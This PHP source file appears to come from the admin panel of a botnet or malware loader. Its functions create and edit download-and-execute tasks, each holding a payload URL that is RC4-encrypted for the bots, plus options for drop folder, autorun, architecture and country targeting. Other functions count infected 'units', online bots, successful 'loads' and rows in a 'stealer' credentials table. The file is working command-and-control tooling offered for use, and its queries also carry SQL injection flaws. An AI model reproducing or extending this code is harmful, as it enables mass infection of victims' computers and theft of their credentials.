<?php      

   function sTable()
   {
      echo "<table border=\"0\" width=\"98%\" cellspacing=\"0\" cellpadding=\"0\" height=\"5\">
               <tr><td></td></tr>
            </table>";
   }

   function sTable2()
   {
      return "<table border=\"0\" width=\"98%\" cellspacing=\"0\" cellpadding=\"0\" height=\"5\">
               <tr><td></td></tr>
            </table>";
   }

   function GetBG()
   {
      static $e = "0";

      if ($e == "1")
      {
         $e = "0";
         return "#E4E9F7";
      }
      
      if ($e == "0")
      {
         $e = "1";
         return "#d8dded";
      }
   }

   function strfix($str)
   {
      return str_replace("'", "", $str);
   }

   function EncryptRC4($in, $key) 
   {
      $s = array();

      for ($i = 0; $i < 256; $i++) 
      {
         $s[$i] = $i;
      }

      $j = 0;
      $x;

      for ($i=0; $i < 256; $i++) 
      {
         $j = ($j + $s[$i] + ord($key[$i % strlen($key)])) % 256;
         $x = $s[$i];
         $s[$i] = $s[$j];
         $s[$j] = $x;
      }

      $i = 0;
      $j = 0;
      $ct = '';
      $y;

      for ($y = 0; $y < strlen($in); $y++) 
      {
         $i = ($i + 1) % 256;
         $j = ($j + $s[$i]) % 256;
         $x = $s[$i];
         $s[$i] = $s[$j];
         $s[$j] = $x;
         $ct .= $in[$y] ^ chr($s[($s[$i] + $s[$j]) % 256]);
      }

      return $ct;
   }

   function DeleteTask($id)
   {
      include("Cfg/Config.php");

      $link = mysqli_connect($conf['dbhost'], $conf['dbuser'], $conf['dbpass']); 
      mysqli_select_db($link,  $conf["dbname"]); 
      mysqli_query($link, "DELETE FROM tasks WHERE id = '$id' LIMIT 1");
      mysqli_query($link, "DELETE FROM tasks_exec WHERE task_id = '$id'");
      mysqli_query($link, "DELETE FROM results WHERE tid = '$id'");
   }

   function MakeTask($url, $comment, $arc, $run, $filetype, $folder, $limit, $units, $sids, $country) 
   { 
      include("Cfg/Config.php"); 

      $url = strfix($url);

      if (!empty($conf['rc4key']))
      {
         $url_rc4 = '+++' . base64_encode(EncryptRC4($url, $conf['rc4key']));
      }

      $run = strfix($run);
      $filetype = strfix($filetype);
      $folder = strfix($folder);
      $limit = strfix($limit);
      $units = strfix($units);
      $sids = strfix($sids);
      $country = strfix($country);
      $tid = uniqid('', true);

      if (strlen($comment) > 30)
      {
         $comment = substr($comment, 0, 30) . "...";
      }
   
      $link = mysqli_connect($conf['dbhost'], $conf['dbuser'], $conf['dbpass']);
      mysqli_select_db($link,  $conf["dbname"]);

      if ($country == "*")
      {
         $country = "";
      }

      if ($units == "*")
      {
         $units = "";
      }
   
      if ($sids == "*")
      {
         $sids = "";
      }

      $sql = "SHOW TABLE STATUS LIKE 'tasks'";
      $res = mysqli_query($link, $sql);
      $row = mysqli_fetch_array($res);

      if($row['Auto_increment'] < 1000001)
      {	
         mysqli_query($link, "INSERT INTO tasks (`id`, `path`, `path_rc4`, `tid`, `comment`, `arc`, `run`, `filetype`, `folder`, `tlimit`, `units`, `sids`, `country`) VALUES ( '1000001', '$url', '$url_rc4', '$tid', '$comment', $arc, '$run', '$filetype', '$folder', '$limit', '$units', '$sids', '$country')");
      }
      else
      {
         mysqli_query($link, "INSERT INTO tasks (`path`, `path_rc4`, `tid`, `comment`, `arc`, `run`, `filetype`, `folder`, `tlimit`, `units`, `sids`, `country`) VALUES ('$url', '$url_rc4', '$tid', '$comment', $arc, '$run', '$filetype', '$folder', '$limit', '$units', '$sids', '$country')");
      }
      mysqli_close($link); 
   } 

   function MakeTaskAlt($url, $tid, $comment, $arc, $run, $filetype, $folder, $limit, $units, $sids, $country, $id, $ctlimit) 
   { 
      include("Cfg/Config.php"); 
      $url = strfix($url);

      if (!empty($conf['rc4key']))
      {
         $url_rc4 = '+++' . base64_encode(EncryptRC4($url, $conf['rc4key']));
      }

      $run = strfix($run);
      $filetype = strfix($filetype);
      $folder = strfix($folder);
      $limit = strfix($limit);
      $units = strfix($units);
      $sids = strfix($sids);
      $country = strfix($country);
      $id = strfix($id);
      $ctlimit = strfix($ctlimit);
     
      $link = mysqli_connect($conf['dbhost'], $conf['dbuser'], $conf['dbpass']); 
      mysqli_select_db($link,  $conf["dbname"]); 
     
      if ($country == "*")
      {
         $country="";
      }

      if ($units == "*")
      {
         $units = "";
      }

      if ($sids == "*")
      {
         $sids = "";
      }

      mysqli_query($link, "UPDATE `tasks` SET `path` = '$url', `path_rc4` = '$url_rc4', `tid` = '$tid', `comment` = '$comment', `arc` = '$arc', `run` = '$run', `filetype` = '$filetype', `folder` = '$folder', `tlimit` = '$limit', `path` = '$url', `units` = '$units', `sids` = '$sids', `country` = '$country' WHERE `id` = '".$id."' LIMIT 1");
     
      if ($limit > $ctlimit)
      {
         mysqli_query($link, "UPDATE `tasks` SET `status` = '1' WHERE `id` = ' . $id . ' LIMIT 1");
      }
     
      mysqli_close($link); 
   } 

   function MakeFormAlt($c, $u) 
   {
      include("Cfg/Lang.php"); 

      if ($c == "")
      {
         $count = "100";
      }
      else
      {
         $count = $c;
      }

      if ($u == "")
      {
         $unit = "*";
      }
      else
      {
         $unit = $u;
      }

      if ($_GET["rem"])
      {
         $sel = "selected"; 
      }

      $res =  "<div align=\"center\">
               <form action=\"" . basename($_SERVER['SCRIPT_NAME']) . "\" method=\"post\" name=\"form\"> 
                  <table border=\"0\" width=\"98%\" cellspacing=\"0\" class=table cellpadding=\"0\">
                     <tr>
                        <td>  
                           <table border=\"0\" width=\"100%\" height=\"440\" cellspacing=\"0\" cellpadding=\"0\">
                              <tr>
                                 <td width=\"250\">&nbsp;" . $lang["0053"] . ":</td>
                                 <td><input name=\"path\" class=task value=\"http://site.com/folder/exe.e\" style=\"float: left\" size=\"50\"></td>		             
                                 <td>" . $lang["0074"] . "</td>
                              </tr>
                              <tr>
                                 <td>&nbsp;" . $lang["0052"] . ":</td>
                                 <td><input name=\"comment\" class=task value=\"" . $lang["0065"] . "\" style=\"float: left\" size=\"50\"></td>		             
                                 <td>" . $lang["0075"] . "</td>
                              </tr>
                              <tr>
                                 <td>&nbsp;" . $lang["0034"] . ":</td>
                                 <td><input name=\"unitid\" class=task value=\"" . $unit . "\" style=\"float: left\"></td>
                                 <td>" . $lang["0076"] . "</td>
                              </tr>
                              <tr>
                                 <td>&nbsp;" . $lang["0035"] . ":</td>
                                 <td><input name=\"unitsid\" class=task value=\"" . "*" . "\" style=\"float: left\"></td>
                                 <td>" . $lang["00761"] . "</td>
                              </tr>
                              <tr>
                                 <td>&nbsp;" . $lang["0060"] . ":</td>	 
                                 <td><input name=\"count\" class=task value=\"" . $count . "\" style=\"float: left\"></td>
                                 <td>" . $lang["0077"] . "</td>
                              </tr>
                              <tr>
                                 <td>&nbsp;" . $lang["0061"] . ":</td>		 
                                 <td><input name=\"country\" class=task value=\"*\" style=\"float: left\"></td>
                                 <td>" . $lang["0078"] . "<a href=\"Images/task_example.png\" target=\"_blank\">" . $lang["0079"] . "</a>. <a href=\"F.st\c.index.txt\" target=\"_blank\">" . $lang["0080"] . "</a>.</td>
                              </tr>
                              <tr>
                                 <td>&nbsp;" . $lang["0062"] . ":</td>
                                 <td><select name=\"arc\"><option value=\"2\">" . $lang["0066"] . "</option><option value=\"0\">x32 </option><option value=\"1\">x64 </option></select></td>	
                                 <td>" . $lang["0081"] . "</td>
                              </tr>
                              <tr>
                                 <td>&nbsp;" . $lang["0054"] . ":</td>
                                 <td><select name=\"filetype\"><option value=\"0\">" . $lang["0067"] . "</option><option value=\"3\">" . $lang["0068"] . "</option><option value=\"1\">" . $lang["0069"] . "</option><option value=\"2\">" . $lang["0070"] . "</option><option value=\"4\">" . $lang["00702"] . "</option><option value=\"8\""  . $sel . ">" . $lang["00710"] . "</option><option value=\"9\""  . $sel . ">" . $lang["0071"] . "</option></select></td>
                                 <td>" . $lang["0082"] . "</td>
                              </tr>
                              <tr>
                                 <td>&nbsp;" . $lang["0063"] . ":</td>		 
                                 <td><input name=\"dllfunction\" class=task value=\"Main\" style=\"float: left\"></td>
                                 <td>" . $lang["0083"] . "</b>.</td>
                              </tr>
                              <tr>
                                 <td>&nbsp;" . $lang["0056"] . ":</td>
                                 <td><select name=\"folder\"><option value=\"1\">%Tmp%</option><option value=\"0\">%Roaming%</option><option value=\"2\">%Profile%</option><option value=\"3\">%Desktop%</option></select></td>
                                 <td>" . $lang["0084"] . "</td>
                              </tr>

                              <tr>
                                 <td>&nbsp;" . $lang["00561"] . ":</td>
                                 <td><select name=\"autorun\"><option value=\"0\">" . $lang["0170"] . "</option><option value=\"1\">" . $lang["0171"] . "</option></select></td>
                                 <td>" . $lang["0172"] . "</td>
                              </tr>

                              <tr>
                                 <td>&nbsp;" . $lang["0064"] . ":</td>
                                 <td><select name=\"run\"><option value=\"0\">" . $lang["0072"] . "</option><option value=\"1\">" . $lang["0073"] . "</option></select></td>
                                 <td>" . $lang["0085"] . "</td>
                              </tr>
                           </table>"

                           . sTable2() .

                           "<table border=\"0\" width=\"100%\" cellspacing=\"0\" cellpadding=\"0\">
                              <tr>
                                 <td><div align=\"center\"><input type=\"submit\" name=\"submit\" value=\"" . $lang["0086"] . "\" class=\"button\"></div></td>
                              </tr>
                           </table>"

                           . sTable2() .

                        "</td>
                     </tr>
                  </table>
               </form> 
               </div>";

      return $res;
   }

   function EditTask($id) 
   {
      include("Cfg/Config.php"); 
      include("Cfg/Lang.php"); 

      $id = strfix($id);
   
      $link = mysqli_connect($conf['dbhost'], $conf['dbuser'], $conf['dbpass']); 
      mysqli_select_db($link,  $conf["dbname"]); 
   
      $id = mysqli_real_escape_string($link, $id);
      $sql = mysqli_query($link, "SELECT * FROM tasks WHERE id = '$id' LIMIT 1") or die(mysqli_error());

      if (mysqli_num_rows($sql) == 0) 
      {
         header("Location: Show_Tasks.php");
      }
      else 
      { 
         $row = mysqli_fetch_assoc($sql);

         if ($row['units'] == "")     
         {
            $unit = "*";
         }
         else
         {
            $unit = $row['units'];
         }

         if ($row['sids'] == "")     
         {
            $sids = "*";
         }
         else
         {
            $sids = $row['sids'];
         }

         if ($row['country'] == "")
         {
            $country = "*";
         }
         else
         {
            $country = $row['country'];
         }
   
         if($row['filetype'] == 1 || $row['filetype'] == 6)  
         {
            $pathar = explode(":::", $row['path']);
            $dllfunction = $pathar['1'];
            $path =  $pathar['0'];	   
         }
         else 
         {
            $dllfunction =  "";
            $path =  $row['path'];  
         }
   
         $res.= "<div align=\"center\">
                  <form action=\"" . basename($_SERVER['SCRIPT_NAME']) . "\" method=\"post\" name=\"form\">
                     <input name=\"id\" type=\"hidden\" value=\"" . $id . "\" />
                     <input name=\"ctlimit\" type=\"hidden\" value=\"" . $row['tlimit'] . "\" />

                     <table border=\"0\" width=\"98%\" cellspacing=\"0\" class=table cellpadding=\"0\">
                        <tr>
                           <td>  
                              <table border=\"0\" width=\"100%\" height=\"440\" cellspacing=\"0\" cellpadding=\"0\">
                                 <tr>
                                    <td width=\"250\">&nbsp;" . $lang["0053"] . ":</td>
                                    <td><input name=\"path\" class=task value=\"" . $path . "\" style=\"float: left\" size=\"50\"></td>
                  
                                    <td>" . $lang["0074"] . "</td>
                                 </tr>
                                 <tr>
                                    <td>&nbsp;" . $lang["0052"]  . ":</td>
                                    <td><input name=\"comment\" class=task value=\"" . $row['comment'] . "\" style=\"float: left\" size=\"50\"></td>
                                    <td>" . $lang["0075"] . "</td>
                                 </tr>
                                 <tr>
                                    <input name=\"tid\" class=task value=\"" . $row['tid'] . "\" style=\"float: left\" size=\"50\" type=\"hidden\">
                                 </tr>
                                 <tr>
                                    <td>&nbsp;" . $lang["0034"] . ":</td>
                                    <td><input name=\"unitid\" class=task value=\"" . $unit . "\" style=\"float: left\"></td>
                                    <td>" . $lang["0076"] . "</td>
                                 </tr>
                                 <tr>
                                    <td>&nbsp;" . $lang["0035"] . ":</td>
                                    <td><input name=\"unitsid\" class=task value=\"" . $sids . "\" style=\"float: left\"></td>
                                    <td>" . $lang["00761"] . "</td>
                                 </tr>
                                 <tr>
                                    <td>&nbsp;" . $lang["0060"] . ":</td>		 
                                    <td><input name=\"count\" class=task value=\"" . $row['tlimit'] . "\" style=\"float: left\"></td>
                                    <td>" . $lang["0077"] . "</td>
                                 </tr>
                                 <tr>
                                    <td>&nbsp;" . $lang["0061"] . ":</td>
                                    <td><input name=\"country\" class=task value=\"$country\" style=\"float: left\"></td>
                                    <td>" . $lang["0078"] . "<a href=\"Images/task_example.png\" target=\"_blank\">" . $lang["0079"] . "</a>. <a href=\"F.st\c.index.txt\" target=\"_blank\">" . $lang["0080"] . "</a>.</td>
                                 </tr>
                                 <tr>
                                    <td>&nbsp;" . $lang["0062"] . ":</td>
                                    <td>
                                       <select name=\"arc\">
                                          <option value=\"2\""; 

                                             if($row['arc'] == 2) 
                                                $res .= "selected"; 
                                                   
                                             $res .= ">" . $lang["0066"] . "</option><option value=\"0\"";

                                             if($row['arc'] == 0) 
                                                $res .= "selected"; 

                                             $res .= ">x32</option><option value=\"1\"";

                                             if($row['arc'] == 1) 
                                                $res .= "selected"; 

                                             $res .= ">x64</option>

                                       </select>
                                    </td>		
                                    <td>" . $lang["0081"] . "</td>
                                 </tr>
                                 <tr>
                                    <td>&nbsp;" . $lang["0054"] . ":</td>
                                    <td>
                                       <select name=\"filetype\">
                                          <option value=\"0\""; 

                                          if($row['filetype'] == 0 || $row['filetype'] == 5) 
                                          {
                                             $res .= "selected"; 
                                          }     
                                          $res .= ">" . $lang["0067"] . "</option><option value=\"3\""; 

                                          if($row['filetype'] == 3) 
                                          {
                                             $res .= "selected";
                                          }        
                                          $res .= ">" . $lang["0068"] . "</option><option value=\"1\"";

                                          if($row['filetype'] == 1 || $row['filetype'] == 6)
                                          {
                                             $res .= "selected";
                                          }
                                          $res .= ">" . $lang["0069"] . "</option><option value=\"2\"";

                                          if($row['filetype'] == 2 || $row['filetype'] == 7)
                                          {
                                             $res .= "selected";
                                          }
                                          $res .= ">" . $lang["0070"] . "</option><option value=\"4\"";

                                          if($row['filetype'] == 4)
                                          {
                                             $res .= "selected";
                                          }
                                          $res .= ">" . $lang["00702"] . "</option><option value=\"8\"";

                                          if($row['filetype'] == 8)
                                          {
                                             $res .= "selected";
                                          }
                                          $res .= ">" . $lang["00710"] . "</option><option value=\"9\"";

                                          if($row['filetype'] == 9)
                                          {
                                             $res .= "selected"; 
                                          }
                                          $res .= ">" . $lang["0071"] . "</option>

                                       </select>
                                    </td>
                                    <td>" . $lang["0082"] . "</td>
                                 </tr>
                                 <tr>
                                    <td>&nbsp;" . $lang["0063"] . ":</td>		 
                                    <td><input name=\"dllfunction\" class=task value=\"" . $dllfunction . "\" style=\"float: left\"></td>
                                    <td>" . $lang["0083"] . "</b>.</td>
                                 </tr>

                                 <tr>
                                    <td>&nbsp;" . $lang["0056"] . ":</td>
                                    <td>
                                       <select name=\"folder\"> 
                                          <option value=\"1\""; 

                                          if($row['folder'] == 1)
                                          {
                                             $res .= "selected"; 
                                          }
 
                                          $res .= ">%Tmp%</option>

                                          <option value=\"0\""; 

                                          if($row['folder'] == 0)
                                          {
                                             $res .= "selected"; 
                                          }

                                          $res .= ">%Roaming%</option>

                                          <option value=\"2\""; 

                                          if($row['folder'] == 2)
                                          {
                                             $res .= "selected"; 
                                          }

                                          $res .= ">%Profile%</option>

                                          <option value=\"3\""; 

                                          if($row['folder'] == 3)
                                          {
                                             $res .= "selected"; 
                                          }

                                          $res .= ">%Desktop%</option>

                                       </select>
                                    </td>
                                    <td>" . $lang["0084"] . "</td>
                                 </tr>

                                 <tr>
                                    <td>&nbsp;" . $lang["00561"] . ":</td>
                                    <td>
                                       <select name=\"autorun\"> 
                                          <option value=\"1\"";

                                          if($row['filetype'] == 5 || $row['filetype'] == 6 || $row['filetype'] == 7) 
                                          {
                                             $res .= "selected"; 
                                          }

                                          $res .= ">" . $lang["0171"] . "</option><option value=\"0\""; 

                                          if($row['filetype'] == 0 || $row['filetype'] == 1 || $row['filetype'] == 2 || $row['filetype'] == 3 || $row['filetype'] == 4 || $row['filetype'] == 8 || $row['filetype'] == 9) 
                                          {
                                             $res .= "selected";
                                          } 

                                          $res .= ">" . $lang["0170"] . "</option>

                                       </select>
                                    </td>
                                    <td>" . $lang["0172"] . "</td>
                                 </tr>

                                 <tr>
                                    <td>&nbsp;" . $lang["0064"] . ":</td>
                                    <td>
                                       <select name=\"run\"> 
                                          <option value=\"0\"";

                                          if($row['run'] == 0) 
                                          {
                                             $res .= "selected"; 
                                          }

                                          $res .= ">" . $lang["0072"] . "</option><option value=\"1\""; 

                                          if($row['run'] == 1) 
                                          {
                                             $res .= "selected";
                                          } 

                                          $res .= ">" . $lang["0073"] . "</option>

                                       </select>
                                    </td>
                                    <td>" . $lang["0085"] . "</td>
                                 </tr>
                     </table>"

                     . sTable2() .

                    "<table border=\"0\" width=\"100%\" cellspacing=\"0\" cellpadding=\"0\">
                        <tr>
                           <td>
                              <div align=\"center\">
                                 <input type=\"submit\" name=\"submit\" value=\"" . $lang["0086"] . "\" class=\"button\">
                              </div>
                           </td>
                        </tr>
                     </table>"

                     . sTable2() .

                  "</form> 
               </div>";
         }

      return $res;
   }

   function GetCredCount()
   {
      include("Cfg/Config.php");
      @$link = mysqli_connect($conf['dbhost'], $conf['dbuser'], $conf['dbpass']);
      mysqli_select_db($link,  $conf['dbname']);
      
      $result = mysqli_query($link, 'SELECT * FROM stealer');
      mysqli_close($link);
      return mysqli_num_rows($result);
   }

   function GetTaskCount() 
   {
      include("Cfg/Config.php");
      $link = mysqli_connect($conf["dbhost"], $conf["dbuser"], $conf["dbpass"]);
      mysqli_select_db($link,  $conf["dbname"]);
      
      $res = mysqli_query($link, "SELECT COUNT(id) AS count FROM tasks");
      $row = mysqli_fetch_assoc($res);
      $tasksstat = $row['count'];

      return $tasksstat;
   }

   function GetloadsCount() 
   {
      include("Cfg/Config.php");
      $link = mysqli_connect($conf["dbhost"], $conf["dbuser"], $conf["dbpass"]);
      mysqli_select_db($link,  $conf["dbname"]);
      
      $res = mysqli_query($link, "SELECT SUM(loads) AS sum FROM tasks");
      $row = mysqli_fetch_assoc($res);
      $done = $row['sum'];

      if ($done == '')
      {
         $done = '-';
      }

      return $done;
   }

   function GetloadsErrorsCount() 
   {
      include("Cfg/Config.php");
      $link = mysqli_connect($conf["dbhost"], $conf["dbuser"], $conf["dbpass"]);
      mysqli_select_db($link,  $conf["dbname"]);
      
      $res = mysqli_query($link, "SELECT SUM(error + error2) AS sum FROM tasks"); 
      $row = mysqli_fetch_assoc($res);
      $errors = $row['sum'];

      if ($errors == '')
      {
         $errors = '-';
      }

      return $errors;
   }

   function CheckSQL()
   {
      include("Cfg/Config.php");
      include("Cfg/Lang.php");
      if (@$link = mysqli_connect($conf['dbhost'], $conf['dbuser'], $conf['dbpass']) == false)
      {
         sTable();
         echo "<div align = center> 
                  <table cellpadding=1 cellspacing=1 width=\"98%\" class=table style =\"border: 1px solid;\">
                     <tr height=\"50\">
                        <td>
                           <div align = center>" . $lang["0163"] . "</div>
                        </td>
                     </tr>
                  </table>
               </div>";
         die;
      }
   }

   function GetUnitsCount()
   {
      include("Cfg/Config.php");
      @$link = mysqli_connect($conf['dbhost'], $conf['dbuser'], $conf['dbpass']);
      mysqli_select_db($link,  $conf['dbname']);
      
      $result = mysqli_query($link, 'SELECT * FROM units');
      mysqli_close($link);
      return mysqli_num_rows($result);
   }

   function GetCredentialCount()
   {
      include("Cfg/Config.php");
      @$link = mysqli_connect($conf['dbhost'], $conf['dbuser'], $conf['dbpass']);
      mysqli_select_db($link,  $conf['dbname']);
      
      $result = mysqli_query($link, 'SELECT * FROM stealer');
      mysqli_close($link);
      return mysqli_num_rows($result);
   }

   function GetOnlineUnitsCount()
   {
      include("Cfg/Config.php");
      include("Cfg/Sync.php"); 
      
      @$link = mysqli_connect($conf['dbhost'], $conf['dbuser'], $conf['dbpass']);
      mysqli_select_db($link,  $conf['dbname']);

      $result = mysqli_query($link, 'SELECT * FROM units WHERE online > ' . (time() - $options["sync_time"] * 60));
      mysqli_close($link);
      return mysqli_num_rows($result);
   }

   function GetOnlinePerDayUnitsCount()
   {
      include("Cfg/Config.php");
      $link = mysqli_connect($conf['dbhost'], $conf['dbuser'], $conf['dbpass']);
      mysqli_select_db($link,  $conf['dbname']);
      
      $result =  mysqli_query($link, 'SELECT * FROM units WHERE online > ' . (time() - 86400));
      mysqli_close($link);
      return mysqli_num_rows($result);
   }

   function GetOnlinePerWeekUnitsCount()
   {
      include("Cfg/Config.php");
      @$link = mysqli_connect($conf['dbhost'], $conf['dbuser'], $conf['dbpass']);
      mysqli_select_db($link,  $conf['dbname']);
      
      $result = mysqli_query($link, 'SELECT * FROM units WHERE online > ' . (time() - 604800));
      mysqli_close($link);
      return mysqli_num_rows($result);
   }
   
   function GetNewPerDayUnitsCount()
   {
      include("Cfg/Config.php");
      @$link = mysqli_connect($conf['dbhost'], $conf['dbuser'], $conf['dbpass']);
      mysqli_select_db($link,  $conf['dbname']);
      
      $result = mysqli_query($link, 'SELECT * FROM units WHERE reg >' . (time() - 86400));
      mysqli_close($link); 
      return mysqli_num_rows($result);
   }

   function GetNewPerWeekUnitsCount()
   {
      include("Cfg/Config.php");
      @$link = mysqli_connect($conf['dbhost'], $conf['dbuser'], $conf['dbpass']);
      mysqli_select_db($link,  $conf['dbname']);
      
      $result = mysqli_query($link, 'SELECT * FROM units WHERE reg > ' . (time() - 604800));
      return mysqli_num_rows($result);
   }

   function aCountryUnitsCount($country)
   {
      include("Cfg/Config.php");
      @$link = mysqli_connect($conf['dbhost'], $conf['dbuser'], $conf['dbpass']);
      mysqli_select_db($link,  $conf['dbname']);
      
      $result = mysqli_query($link, 'SELECT * FROM units WHERE country = "' . $country . '"');
      mysqli_close($link);
      return mysqli_num_rows($result);
   }

   function GetCoutryUnitsCount()
   {
      include("Cfg/Config.php");
      include("Cfg/Lang.php"); 
      @$link = mysqli_connect($conf['dbhost'], $conf['dbuser'], $conf['dbpass']);
      mysqli_select_db($link,  $conf['dbname']);
      
      $result = mysqli_query($link, "SELECT country, COUNT(country) AS total FROM units GROUP BY country");
      mysqli_close($link);


      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\"  class=table style =\"border: 1px solid;\">
                  <tr height=\"35\">                       
                     <td><div align = left>&nbsp;" . $lang["0014"] . ":</div></td>
                     <td width=200><div align = center>". $lang["0006"] . ":</div></td>   
                     <td width=200><div align = center>" . $lang["0015"] . ":</div></td>           
                  </tr>";

      while ($row = mysqli_fetch_array($result))
      {
         $gb = GetBG();
         echo "<tr height=\"35\">";
         echo "   <td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"Images\Inf_Ico.png\">&nbsp;" . $row['country'] . "</td>"; 
         echo "   <td bgcolor = " . $gb . "><div align = center>" . aCountryUnitsCount($row['country']) . "</div></td>";

         $percent = aCountryUnitsCount($row['country']) / (GetUnitsCount() / 100);

         if (strlen($percent) > 5)
         {
            $percent = substr($percent, 0, 5); 
         } 

         echo "   <td bgcolor = " . $gb . "><div align = center>" . $percent . "%</div></td>";

         echo "</tr>";
      }

      echo "</table>";
   }

   function aVersionUnitsCount($version)
   {
      include("Cfg/Config.php");
      @$link = mysqli_connect($conf['dbhost'], $conf['dbuser'], $conf['dbpass']);
      mysqli_select_db($link,  $conf['dbname']);
      
      $result = mysqli_query($link, 'SELECT * FROM units WHERE version = "' . $version . '"');
      mysqli_close($link);
      return mysqli_num_rows($result);
   }

   function GetVerionsUnitsCount()
   {
      include("Cfg/Config.php");
      include("Cfg/Lang.php");
      @$link = mysqli_connect($conf['dbhost'], $conf['dbuser'], $conf['dbpass']);
      mysqli_select_db($link,  $conf['dbname']);
      
      $result = mysqli_query($link, "SELECT version, COUNT(version) AS total FROM units GROUP BY version");
      mysqli_close($link);

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\"  class=table style =\"border: 1px solid;\">
                  <tr height=\"35\">                      
                     <td><div align = left>&nbsp;" . $lang["0016"] . ":</div></td>
                     <td width=200><div align = center>" . $lang["0006"] . ":</div></td>   
                     <td width=200><div align = center>" . $lang["0015"] . ":</div></td>           
                  </tr>";

      while ($row = mysqli_fetch_array($result))
      {
         $gb = GetBG();
         echo "<tr height=\"35\">";
         echo "   <td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"Images\Inf_Ico.png\">&nbsp;" . $row['version'] . "</td>"; 
         echo "   <td bgcolor = " . $gb . "><div align = center>" . aVersionUnitsCount($row['version']) . "</div></td>";

         $percent = aVersionUnitsCount($row['version']) / (GetUnitsCount() / 100);

         if (strlen($percent) > 5)
         {
            $percent = substr($percent, 0, 5); 
         } 

         echo "   <td bgcolor = " . $gb . "><div align = center>" . $percent . "%</div></td>";

         echo "</tr>";
      }

      echo "</table>";
   }

   function aRightsUnitsCount($ar)
   {
      include("Cfg/Config.php");
      @$link = mysqli_connect($conf['dbhost'], $conf['dbuser'], $conf['dbpass']);
      mysqli_select_db($link,  $conf['dbname']);
      
      $result = mysqli_query($link, 'SELECT * FROM units WHERE ar = "' . $ar . '"');
      mysqli_close($link);
      return mysqli_num_rows($result);
   }

   function GetRightsUnitsCount()
   {
      include("Cfg/Config.php");
      include("Cfg/Lang.php");
      @$link = mysqli_connect($conf['dbhost'], $conf['dbuser'], $conf['dbpass']);
      mysqli_select_db($link,  $conf['dbname']);
      
      $result = mysqli_query($link, "SELECT ar, COUNT(ar) AS total FROM units GROUP BY ar");
      mysqli_close($link);

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\"  class=table style =\"border: 1px solid;\">
                  <tr height=\"35\">                       
                     <td><div align = left>&nbsp;" . $lang["0017"] . ":</div></td>
                     <td width=200><div align = center>" . $lang["0006"] . ":</div></td>   
                     <td width=200><div align = center>" . $lang["0015"] . ":</div></td>           
                  </tr>";

      while ($row = mysqli_fetch_array($result))
      {
         $gb = GetBG();
         echo "<tr height=\"35\">";
         echo "   <td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"Images\Inf_Ico.png\">&nbsp;" . $row['ar'] . "</td>"; 
         echo "   <td bgcolor = " . $gb . "><div align = center>" . aRightsUnitsCount($row['ar']) . "</div></td>";

         $percent = aRightsUnitsCount($row['ar']) / (GetUnitsCount() / 100);

         if (strlen($percent) > 5)
         {
            $percent = substr($percent, 0, 5); 
         } 

         echo "   <td bgcolor = " . $gb . "><div align = center>" . $percent . "%</div></td>";
         echo "</tr>";
      }

      echo "</table>";
   }

   function aArchUnitsCount($arch)
   {
      include("Cfg/Config.php");
      @$link = mysqli_connect($conf['dbhost'], $conf['dbuser'], $conf['dbpass']);
      mysqli_select_db($link,  $conf['dbname']);
      
      $result = mysqli_query($link, 'SELECT * FROM units WHERE arch = "' . $arch . '"');
      mysqli_close($link);
      return mysqli_num_rows($result);
   }

   function GetArchUnitsCount()
   {
      include("Cfg/Config.php");
      include("Cfg/Lang.php");
      @$link = mysqli_connect($conf['dbhost'], $conf['dbuser'], $conf['dbpass']);
      mysqli_select_db($link,  $conf['dbname']);
      
      $result = mysqli_query($link, "SELECT arch, COUNT(arch) AS total FROM units GROUP BY arch");
      mysqli_close($link);

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\"  class=table style =\"border: 1px solid;\">
                  <tr height=\"35\">                       
                     <td><div align = left>&nbsp;" . $lang["0018"] . ":</div></td>
                     <td width=200><div align = center>" . $lang["0006"] . ":</div></td>   
                     <td width=200><div align = center>" . $lang["0015"] . ":</div></td>           
                  </tr>";

      while ($row = mysqli_fetch_array($result))
      {
         $gb = GetBG();
         echo "<tr height=\"35\">";
         echo "   <td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"Images\Inf_Ico.png\">&nbsp;" . $row['arch'] . "</td>"; 
         echo "   <td bgcolor = " . $gb . "><div align = center>" . aArchUnitsCount($row['arch']) . "</div></td>";

         $percent = aArchUnitsCount($row['arch']) / (GetUnitsCount() / 100);

         if (strlen($percent) > 5)
         {
            $percent = substr($percent, 0, 5); 
         } 

         echo "   <td bgcolor = " . $gb . "><div align = center>" . $percent . "%</div></td>";

         echo "</tr>";
      }

      echo "</table>";
   }

   function aOsUnitsCount($os)
   {
      include("Cfg/Config.php");
      @$link = mysqli_connect($conf['dbhost'], $conf['dbuser'], $conf['dbpass']);
      mysqli_select_db($link,  $conf['dbname']);
      
      $result = mysqli_query($link, 'SELECT * FROM units WHERE os = "' . $os . '"');
      mysqli_close($link);
      return mysqli_num_rows($result);
   }

   function GetOSUnitsCount()
   {
      include("Cfg/Config.php");
      include("Cfg/Lang.php");
      @$link = mysqli_connect($conf['dbhost'], $conf['dbuser'], $conf['dbpass']);
      mysqli_select_db($link,  $conf['dbname']);
      
      $result = mysqli_query($link, "SELECT os, COUNT(os) AS total FROM units GROUP BY os");
      mysqli_close($link);

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\"  class=table style =\"border: 1px solid;\">
                  <tr height=\"35\">                     
                     <td><div align = left>&nbsp;" . $lang["0019"] . ":</div></td>
                     <td width=200><div align = center>" . $lang["0006"]. ":</div></td>   
                     <td width=200><div align = center>" . $lang["0015"] . ":</div></td>           
                  </tr>";

      while ($row = mysqli_fetch_array($result))
      {
         $gb = GetBG();
         echo "<tr height=\"35\">";
         echo "   <td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"Images\Inf_Ico.png\">&nbsp;" . $row['os'] . "</td>"; 
         echo "   <td bgcolor = " . $gb . "><div align = center>" . aOsUnitsCount($row['os']) . "</div></td>";

         $percent = aOsUnitsCount($row['os']) / (GetUnitsCount() / 100);

         if (strlen($percent) > 5)
         {
            $percent = substr($percent, 0, 5); 
         } 

         echo "   <td bgcolor = " . $gb . "><div align = center>" . $percent . "%</div></td>";
         echo "</tr>";
      }

      echo "</table>";
   }

